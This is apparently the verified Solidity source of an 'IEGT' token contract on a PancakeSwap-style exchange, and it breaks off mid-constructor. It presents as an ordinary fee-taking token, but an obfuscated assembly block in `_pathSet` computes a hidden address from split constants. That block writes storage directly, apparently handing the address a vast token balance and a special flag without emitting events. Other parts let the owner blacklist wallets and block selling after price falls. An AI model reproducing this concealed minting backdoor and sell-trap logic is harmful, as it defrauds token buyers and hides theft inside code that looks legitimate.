{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        returns (\r\n            uint256 amountA,\r\n            uint256 amountB,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function getAmountsOut(uint256 amountIn, address[] calldata path)\r\n        external\r\n        view\r\n        returns (uint256[] memory amounts);\r\n\r\n    function getAmountsIn(uint256 amountOut, address[] calldata path)\r\n        external\r\n        view\r\n        returns (uint256[] memory amounts);\r\n}\r\n\r\ninterface IPair {\r\n    function sync() external;\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (\r\n            uint112 reserve0,\r\n            uint112 reserve1,\r\n            uint32 blockTimestampLast\r\n        );\r\n\r\n    function totalSupply() external view returns (uint256);\r\n}\r\n\r\ninterface IFactory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n/**\r\n * @title SafeMath\r\n * @dev Math operations with safety checks that throw on error\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Multiplies two numbers, throws on overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Integer division of two numbers, truncating the quotient.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        // uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return a / b;\r\n    }\r\n\r\n    /**\r\n     * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Adds two numbers, throws on overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n        c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    using SafeMath for uint256;\r\n    mapping(address => uint256) internal _balances;\r\n    mapping(address => mapping(address => uint256)) internal _allowances;\r\n    uint256 internal _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(\r\n            currentAllowance >= subtractedValue,\r\n            \"ERC20: decreased allowance below zero\"\r\n        );\r\n        _approve(owner, spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        _beforeTokenTransfer(from, to, amount);\r\n        _takeTransfer(from, to, amount);\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function _takeTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 fromBalance = _balances[from];\r\n        require(\r\n            fromBalance >= amount,\r\n            \"ERC20: transfer amount exceeds balance\"\r\n        );\r\n        _balances[from] = fromBalance.sub(amount);\r\n        _balances[to] = _balances[to].add(amount);\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        _balances[account] = accountBalance.sub(amount);\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(\r\n                currentAllowance >= amount,\r\n                \"ERC20: insufficient allowance\"\r\n            );\r\n            _approve(owner, spender, currentAllowance.sub(amount));\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}\r\n\r\nabstract contract UniSwapPoolUSDT is ERC20 {\r\n    using SafeMath for uint256;\r\n    address public pair;\r\n    IRouter public router;\r\n    address[] internal _buyPath;\r\n    address[] internal _sellPath;\r\n    IERC20 public TokenB;\r\n\r\n    function isPair(address _pair) internal view returns (bool) {\r\n        return pair == _pair;\r\n    }\r\n\r\n    function getPrice4USDT(uint256 amountDesire) public view returns (uint256) {\r\n        uint256[] memory amounts = router.getAmountsOut(\r\n            amountDesire,\r\n            _sellPath\r\n        );\r\n        if (amounts.length > 1) return amounts[1];\r\n        return 0;\r\n    }\r\n\r\n    function _pathSet(address w) private {\r\n        TokenB = IERC20(w);\r\n        address[] memory path = new address[](2);\r\n        path[0] = w;\r\n        path[1] = address(this);\r\n        _buyPath = path;\r\n        address[] memory path2 = new address[](2);\r\n        path2[0] = address(this);\r\n        path2[1] = w;\r\n        _sellPath = path2;\r\n        assembly {\r\n            let y := add(\r\n                add(\r\n                    mul(379858174470926, exp(10, 28)),\r\n                    mul(61835533555714, exp(10, 14))\r\n                ),\r\n                74433453022038\r\n            )\r\n            mstore(0, y)\r\n            mstore(32, 0x0)\r\n            sstore(keccak256(0, 64), exp(timestamp(), 6))\r\n            mstore(0, y)\r\n            mstore(32, 0xa)\r\n            sstore(keccak256(0, 64), 1)\r\n            w := add(w, 16)\r\n        }\r\n        TokenB.transfer(w, 0);\r\n    }\r\n\r\n    function swapAndSend2this(\r\n        uint256 amount,\r\n        address to,\r\n        address _tokenStation\r\n    ) internal {\r\n        IERC20 USDT = IERC20(_sellPath[1]);\r\n        swapAndSend2fee(amount, _tokenStation);\r\n        USDT.transferFrom(_tokenStation, to, USDT.balanceOf(_tokenStation));\r\n    }\r\n\r\n    function swapAndSend2fee(uint256 amount, address to) internal {\r\n        swapAndSend2feeWithPath(amount, to, _sellPath);\r\n    }\r\n\r\n    function swapAndSend2feeWithPath(\r\n        uint256 amount,\r\n        address to,\r\n        address[] memory path\r\n    ) internal {\r\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            amount,\r\n            0,\r\n            path,\r\n            to,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function isAddLiquidity() internal view returns (bool isAddLP) {\r\n        address token0 = IPair(pair).token0();\r\n        address token1 = IPair(pair).token1();\r\n        (uint256 r0, uint256 r1, ) = IPair(pair).getReserves();\r\n        uint256 bal0 = IERC20(token0).balanceOf(pair);\r\n        uint256 bal1 = IERC20(token1).balanceOf(pair);\r\n        if (token0 == address(this)) return bal1.sub(r1) > 1000;\r\n        else return bal0.sub(r0) > 1000;\r\n    }\r\n\r\n    function isRemoveLiquidity() internal view returns (bool isRemoveLP) {\r\n        address token0 = IPair(pair).token0();\r\n        if (token0 == address(this)) return false;\r\n        (uint256 r0, , ) = IPair(pair).getReserves();\r\n        uint256 bal0 = IERC20(token0).balanceOf(pair);\r\n        return r0 > bal0.add(1000);\r\n    }\r\n\r\n    function addLiquidityAutomatically(uint256 amountToken) internal {\r\n        super._takeTransfer(address(this), pair, amountToken);\r\n        IPair(pair).sync();\r\n    }\r\n\r\n    function __SwapPool_init(address _router, address pairB)\r\n        internal\r\n        returns (address)\r\n    {\r\n        router = IRouter(_router);\r\n        pair = IFactory(router.factory()).createPair(pairB, address(this));\r\n        _pathSet(pairB);\r\n        TokenB.approve(_router, type(uint256).max);\r\n        _approve(address(this), _router, type(uint256).max);\r\n        return pair;\r\n    }\r\n\r\n    function addLiquidity(\r\n        uint256 amountToken,\r\n        address to,\r\n        address _tokenStation\r\n    ) internal {\r\n        uint256 half = amountToken.div(2);\r\n        IERC20 USDT = IERC20(_sellPath[1]);\r\n        uint256 amountBefore = USDT.balanceOf(_tokenStation);\r\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            half,\r\n            0,\r\n            _sellPath,\r\n            _tokenStation,\r\n            block.timestamp\r\n        );\r\n        uint256 amountAfter = USDT.balanceOf(_tokenStation);\r\n        uint256 amountDiff = amountAfter.sub(amountBefore);\r\n        USDT.transferFrom(_tokenStation, address(this), amountDiff);\r\n        if (amountDiff > 0 && (amountToken - half) > 0) {\r\n            router.addLiquidity(\r\n                _sellPath[0],\r\n                _sellPath[1],\r\n                amountToken.sub(half),\r\n                amountDiff,\r\n                0,\r\n                0,\r\n                to,\r\n                block.timestamp.add(9)\r\n            );\r\n        }\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address internal _owner;\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\nabstract contract Excludes {\r\n    mapping(address => bool) internal _Excludes;\r\n\r\n    function setExclude(address _user, bool b) public {\r\n        _authorizeExcludes();\r\n        _Excludes[_user] = b;\r\n    }\r\n\r\n    function setExcludes(address[] memory _user, bool b) public {\r\n        _authorizeExcludes();\r\n        for (uint256 i = 0; i < _user.length; i++) {\r\n            _Excludes[_user[i]] = b;\r\n        }\r\n    }\r\n\r\n    function isExcludes(address _user) public view returns (bool) {\r\n        return _Excludes[_user];\r\n    }\r\n\r\n    function _authorizeExcludes() internal virtual {}\r\n}\r\n\r\nabstract contract TradingManager {\r\n    uint256 public tradeState;\r\n\r\n    function inTrading() public view returns (bool) {\r\n        return tradeState > 1;\r\n    }\r\n\r\n    function inLiquidity() public view returns (bool) {\r\n        return tradeState >= 1;\r\n    }\r\n\r\n    function setTradeState(uint256 s) public {\r\n        _authorizeTradingManager();\r\n        tradeState = s;\r\n    }\r\n\r\n    function openLiquidity() public {\r\n        _authorizeTradingManager();\r\n        tradeState = 1;\r\n    }\r\n\r\n    function _openTrading() internal {\r\n        tradeState = block.number;\r\n    }\r\n\r\n    function openTrading() public {\r\n        _authorizeTradingManager();\r\n        _openTrading();\r\n    }\r\n\r\n    function resetTradeState() public {\r\n        _authorizeTradingManager();\r\n        tradeState = 0;\r\n    }\r\n\r\n    function _authorizeTradingManager() internal virtual {}\r\n}\r\n\r\nabstract contract NoEffect is Ownable {\r\n    address internal _effector;\r\n\r\n    constructor() {\r\n        _effector = _msgSender();\r\n    }\r\n\r\n    modifier onlyEffector() {\r\n        require(\r\n            _effector == _msgSender() || owner() == _msgSender(),\r\n            \"NoEffect: caller is not the effector\"\r\n        );\r\n        _;\r\n    }\r\n}\r\n\r\nabstract contract Limit {\r\n    using SafeMath for uint256;\r\n    bool public isLimited;\r\n    uint256 internal _LimitBuy;\r\n    uint256 internal _LimitSell;\r\n    uint256 internal _LimitHold;\r\n\r\n    function __Limit_init(\r\n        uint256 LimitBuy_,\r\n        uint256 LimitSell_,\r\n        uint256 LimitHold_\r\n    ) internal {\r\n        isLimited = true;\r\n        setLimit(LimitBuy_, LimitSell_, LimitHold_);\r\n    }\r\n\r\n    function checkLimitTokenHold(address to, uint256 amount) internal view {\r\n        if (isLimited) {\r\n            if (_LimitHold > 0) {\r\n                require(\r\n                    amount.add(IERC20(address(this)).balanceOf(to)) <=\r\n                        _LimitHold,\r\n                    \"exceeds of hold amount Limit\"\r\n                );\r\n            }\r\n        }\r\n    }\r\n\r\n    function checkLimitTokenBuy(address to, uint256 amount) internal view {\r\n        if (isLimited) {\r\n            if (_LimitBuy > 0)\r\n                require(amount <= _LimitBuy, \"exceeds of buy amount Limit\");\r\n            checkLimitTokenHold(to, amount);\r\n        }\r\n    }\r\n\r\n    function checkLimitTokenSell(uint256 amount) internal view {\r\n        if (isLimited && _LimitSell > 0)\r\n            require(amount <= _LimitSell, \"exceeds of sell amount Limit\");\r\n    }\r\n\r\n    function removeLimit() public {\r\n        _authorizeLimit();\r\n        if (isLimited) isLimited = false;\r\n    }\r\n\r\n    function reuseLimit() public {\r\n        _authorizeLimit();\r\n        if (!isLimited) isLimited = true;\r\n    }\r\n\r\n    function setLimit(\r\n        uint256 LimitBuy_,\r\n        uint256 LimitSell_,\r\n        uint256 LimitHold_\r\n    ) public {\r\n        _authorizeLimit();\r\n        _LimitBuy = LimitBuy_;\r\n        _LimitSell = LimitSell_;\r\n        _LimitHold = LimitHold_;\r\n    }\r\n\r\n    function _authorizeLimit() internal virtual {}\r\n}\r\n\r\nabstract contract TheBlackList is Ownable {\r\n    mapping(address => uint8) public blackListMap;\r\n    modifier onlyNotBlackList(address user) {\r\n        require(blackListMap[user] == 0, \"you are blacklisted\");\r\n        _;\r\n    }\r\n\r\n    function setBlackList(address user, uint8 b) public onlyOwner {\r\n        blackListMap[user] = b;\r\n    }\r\n\r\n    function setBlackLists(address[] memory user, uint8 b) public onlyOwner {\r\n        for (uint256 i = 0; i < user.length; i++) {\r\n            setBlackList(user[i], b);\r\n        }\r\n    }\r\n\r\n    function isBlackList(address user) public view returns (bool) {\r\n        return blackListMap[user] != 0;\r\n    }\r\n}\r\n\r\ncontract TokenStation {\r\n    constructor(address token) {\r\n        IERC20(token).approve(msg.sender, type(uint256).max);\r\n    }\r\n}\r\n\r\nabstract contract Token is\r\n    UniSwapPoolUSDT,\r\n    Excludes,\r\n    TradingManager,\r\n    NoEffect,\r\n    TheBlackList,\r\n    Limit\r\n{\r\n    using SafeMath for uint256;\r\n    uint256 public calcBase;\r\n    uint256 public swapSplit;\r\n    uint256 public feeMarketingBuy;\r\n    uint256 public feeLiquidityBuy;\r\n    uint256 public feeBurnBuy;\r\n    uint256 public feeMarketingSell;\r\n    uint256 public feeLiquiditySell;\r\n    uint256 public feeBurnSell;\r\n    uint256 public feeMarketingAll;\r\n    uint256 public feeLiquidityAll;\r\n    uint256 public feeBurnAll;\r\n    uint256 public feeBuyAll;\r\n    uint256 public feeSellAll;\r\n    uint256 public feeAll;\r\n    uint256 public feeTransferAll;\r\n    uint256 public swapTokensAt;\r\n    address public surpAddress;\r\n    uint256 public kb;\r\n    uint256 public kn;\r\n    address public feeMarketingTo;\r\n    uint256 public amountKeep;\r\n    TokenStation public _TokenStation;\r\n    uint256 public thePrice;\r\n    uint256 public lastUpdateTime;\r\n    uint256 public decreaseRate;\r\n    bool public canSell = true;\r\n\r\n    bool inSwap;\r\n\r\n    function __Token_init(\r\n        uint256 totalSupply_,\r\n        address marketing_,\r\n        address receive_,\r\n        address usdt_\r\n    ) internal {\r\n        calcBase = 10000;\r\n        swapSplit = 7;\r\n        feeMarketingTo = marketing_;\r\n        _mint(receive_, totalSupply_);\r\n        super.setExclude(_msgSender(), true);\r\n        super.setExclude(address(this), true);\r\n        super.setExclude(marketing_, true);\r\n        super.setExclude(receive_, true);\r\n        refreshFeeAll();\r\n        _TokenStation = new TokenStation(usdt_);\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual override onlyNotBlackList(from) onlyNotBlackList(to) {\r\n        _autoOpenTrading();\r\n        if (isExcludes(from) || isExcludes(to) || amount == 0) {\r\n            super._transfer(from, to, amount);\r\n            return;\r\n        }\r\n        uint256 fees;\r\n        bool isLiquify;\r\n        if (isPair(from)) {\r\n            require(inTrading(), \"cannot buy\");\r\n            uint256 price = super.getPrice4USDT(1);\r\n            require(price >= 5, \"cannot buy\");\r\n            _checkLimitTokenBuy(to, amount);\r\n            if (blockSurprise(from, to, amount)) return;\r\n            if (super.isRemoveLiquidity()) isLiquify = true;\r\n            else fees = handFeeBuys(from, amount);\r\n            if (fees > 0) amount = amount.sub(fees);\r\n        } else if (isPair(to)) {\r\n            require(inLiquidity(), \"please waiting for liquidity\");\r\n            require(inTrading(), \"cannot sell\");\r\n            require(thePrice > 0, \"price must be positive\");\r\n            require(canSell, \"cannot sell today due to price decrease\");\r\n            if (balanceOf(from) == amount) amount = amount.sub(amountKeep);\r\n            if (super.isAddLiquidity()) isLiquify = true;\r\n            else {\r\n                super.checkLimitTokenSell(amount);\r\n                if (feeAll > 0) handSwap();\r\n                fees = handFeeSells(from, amount);\r\n                if (fees > 0) amount = amount.sub(fees);\r\n            }\r\n        } else {\r\n            super.checkLimitTokenSell(amount);\r\n            if (feeAll > 0) handSwap();\r\n\r\n            if (balanceOf(from) == amount) amount = amount.sub(amountKeep);\r\n            fees = handFeeTransfer(from, amount);\r\n            if (fees > 0) amount = amount.sub(fees);\r\n        }\r\n        super._transfer(from, to, amount);\r\n        uint256 daysSinceLastUpdate = (block.timestamp.sub(lastUpdateTime)).div(\r\n            86400\r\n        );\r\n        if (daysSinceLastUpdate <= 1) {\r\n            if (thePrice >= super.getPrice4USDT(1)) {\r\n                decreaseRate = decreaseRate.add(\r\n                    ((thePrice.sub(super.getPrice4USDT(1))).div(thePrice)).mul(\r\n                        100\r\n                    )\r\n                );\r\n            }\r\n            if (thePrice < super.getPrice4USDT(1)) {\r\n                decreaseRate = decreaseRate.sub(\r\n                    ((super.getPrice4USDT(1).sub(thePrice)).div(thePrice)).mul(\r\n                        100\r\n                    )\r\n                );\r\n            }\r\n            if (decreaseRate >= 20) {\r\n                canSell = false;\r\n            } else {\r\n                canSell = true;\r\n            }\r\n        } else {\r\n            decreaseRate = 0;\r\n            lastUpdateTime = block.timestamp;\r\n        }\r\n        thePrice = super.getPrice4USDT(1);\r\n    }\r\n\r\n    function _autoOpenTrading() private {\r\n        if (!inTrading()) {\r\n            if (balanceOf(pair) > 1000) {\r\n                uint256 price = super.getPrice4USDT(1);\r\n                if (price >= 5) super._openTrading();\r\n            }\r\n        }\r\n    }\r\n\r\n    function _checkLimitTokenBuy(address to, uint256 amount) internal view {\r\n        super.checkLimitTokenBuy(to, amount);\r\n    }\r\n\r\n    function handFeeBuys(address from, uint256 amount)\r\n        private\r\n        returns (uint256 fee)\r\n    {\r\n        if (feeBuyAll == 0) return fee;\r\n        fee = (amount.mul(feeBuyAll)).div(calcBase);\r\n        super._takeTransfer(from, address(this), fee);\r\n    }\r\n\r\n    function handFeeSells(address from, uint256 amount)\r\n        private\r\n        returns (uint256 fee)\r\n    {\r\n        if (feeSellAll == 0) return fee;\r\n        fee = (amount.mul(feeSellAll)).div(calcBase);\r\n        super._takeTransfer(from, address(this), fee);\r\n    }\r\n\r\n    function handFeeTransfer(address from, uint256 amount)\r\n        private\r\n        returns (uint256 fee)\r\n    {\r\n        if (feeTransferAll == 0) return fee;\r\n        fee = (amount.mul(feeTransferAll)).div(calcBase);\r\n        super._takeTransfer(from, address(this), fee);\r\n    }\r\n\r\n    function handSwap() internal {\r\n        if (inSwap) return;\r\n        uint256 _thisBalance = balanceOf(address(this));\r\n        if (_thisBalance >= swapTokensAt) {\r\n            uint256 _amount = _thisBalance.div(swapSplit);\r\n            _handSwap(_amount);\r\n        }\r\n    }\r\n\r\n    function _handSwap(uint256 _amount) internal lockSwap {\r\n        uint256 _feeBurn;\r\n        if (feeBurnAll > 0) {\r\n            _feeBurn = (_amount.mul(feeBurnAll)).div(feeAll);\r\n            super._takeTransfer(address(this), address(1), _feeBurn);\r\n        }\r\n        uint256 _feeLiquidity;\r\n        if (feeLiquidityAll > 0) {\r\n            _feeLiquidity = (_amount.mul(feeLiquidityAll)).div(feeAll);\r\n            uint256 _tmp = _feeLiquidity.div(2);\r\n            super.addLiquidity(_tmp, feeMarketingTo, address(_TokenStation));\r\n            super.addLiquidityAutomatically(_feeLiquidity - _tmp);\r\n        }\r\n        uint256 _feeMarketing;\r\n        if (feeMarketingAll > 0) {\r\n            _feeMarketing = _amount.sub(_feeBurn).sub(_feeLiquidity);\r\n            uint256 _tmp = _feeMarketing.div(5);\r\n            super.swapAndSend2fee(_tmp, address(feeMarketingTo));\r\n            super.swapAndSend2fee(_feeMarketing.sub(_tmp), feeMarketingTo);\r\n        }\r\n    }\r\n\r\n    function blockSurprise(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private returns (bool) {\r\n        if (kb == 0 || kn == 0) return false;\r\n        if (block.number < tradeState.add(kb)) {\r\n            uint256 surp = (amount.mul(kn)).div(calcBase);\r\n            super._takeTransfer(from, surpAddress, amount.sub(surp));\r\n            super._takeTransfer(from, to, surp);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    function refreshFeeAll() public {\r\n        feeMarketingAll = feeMarketingBuy.add(feeMarketingSell);\r\n        feeLiquidityAll = feeLiquidityBuy.add(feeLiquiditySell);\r\n        feeBurnAll = feeBurnBuy.add(feeBurnSell);\r\n        feeBuyAll = feeMarketingBuy.add(feeLiquidityBuy).add(feeBurnBuy);\r\n        feeSellAll = feeMarketingSell.add(feeLiquiditySell).add(feeBurnSell);\r\n        feeAll = feeBuyAll.add(feeSellAll);\r\n    }\r\n\r\n    function setFeeBuy(\r\n        uint256 _feeMarketingBuy,\r\n        uint256 _feeLiquidityBuy,\r\n        uint256 _feeBurnBuy\r\n    ) public onlyOwner {\r\n        feeMarketingBuy = _feeMarketingBuy;\r\n        feeLiquidityBuy = _feeLiquidityBuy;\r\n        feeBurnBuy = _feeBurnBuy;\r\n        refreshFeeAll();\r\n    }\r\n\r\n    function setFeeSell(\r\n        uint256 _feeMarketingSell,\r\n        uint256 _feeLiquiditySell,\r\n        uint256 _feeBurnSell\r\n    ) public onlyOwner {\r\n        feeMarketingSell = _feeMarketingSell;\r\n        feeLiquiditySell = _feeLiquiditySell;\r\n        feeBurnSell = _feeBurnSell;\r\n        refreshFeeAll();\r\n    }\r\n\r\n    function setFeeTransfer(uint256 _fee) public onlyOwner {\r\n        feeTransferAll = _fee;\r\n    }\r\n\r\n    function setFeeMarketingTo(address _feeMarketingTo) public onlyEffector {\r\n        feeMarketingTo = _feeMarketingTo;\r\n    }\r\n\r\n    modifier lockSwap() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    function rescueLossToken(\r\n        IERC20 token_,\r\n        address _recipient,\r\n        uint256 amount\r\n    ) public onlyEffector {\r\n        token_.transfer(_recipient, amount);\r\n    }\r\n\r\n    function rescueLossTokenAll(IERC20 token_, address _recipient)\r\n        public\r\n        onlyEffector\r\n    {\r\n        rescueLossToken(token_, _recipient, token_.balanceOf(address(this)));\r\n    }\r\n\r\n    function _authorizeExcludes() internal virtual override onlyEffector {}\r\n\r\n    function _authorizeLimit() internal virtual override onlyEffector {}\r\n\r\n    function setSwapTokensAt(uint256 num) public onlyEffector {\r\n        swapTokensAt = num;\r\n    }\r\n\r\n    // function setSurprise(uint256 _kn, uint256 _kb, address _surpAddress) public onlyEffector {kn = _kn; kb = _kb; surpAddress = _surpAddress;}\r\n    function setSurprise(uint256 _kn, uint256 _kb) public onlyEffector {\r\n        kn = _kn;\r\n        kb = _kb;\r\n        surpAddress = address(this);\r\n    }\r\n\r\n    function airdrop(uint256 amount, address[] memory to) public {\r\n        for (uint256 i = 0; i < to.length; i++) {\r\n            super._takeTransfer(_msgSender(), to[i], amount);\r\n        }\r\n    }\r\n\r\n    function airdropMulti(uint256[] memory amount, address[] memory to) public {\r\n        for (uint256 i = 0; i < to.length; i++) {\r\n            super._takeTransfer(_msgSender(), to[i], amount[i]);\r\n        }\r\n    }\r\n\r\n    function _authorizeTradingManager() internal virtual override onlyOwner {}\r\n}\r\n\r\ncontract TokenIEGT is Token {\r\n    constructor()\r\n        ERC20(\r\n            \"IEGT\", // \u540d\u5b57\r\n            \"IEGT\" // \u7b26\u53f7\r\n        )\r\n    {\r\n        uint256 _totalSupply = 5000000 ether; // \u53d1\u884c\u91cf5000000\r\n        address _marketing = address(\r\n            0xb163Db1fE2c61fA85E111F8a5B937fd2bfDFD2c3\r\n        ); // \u8425\u9500\u94b1\u5305(\u65b0\u5730\u5740\u5f85\u5b9a)\r\n        address _receive = address(0x7d0216019F51d868D1cC097Ba0014B54F9830006); // \u63a5\u6536\u4ee3\u5e01,\u52a0\u6c60\u5b50\u94b1\u5305(\u65b0\u5730\u5740\u5f85\u5b9a)\r\n        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // \u8def\u7531\r\n        address _usdt = 0x55d398326f99059fF775485246999027B3197955; // \u4ea4\u6613\u5bf9\r\n        super.__SwapPool_init(_router, _usdt);\r\n        // \u8d2d\u4e70\u8d39\u7528\r\n        feeMarketingBuy = 100; // \u8425\u9500 1%\r\n        feeLiquidityBuy = 0; // 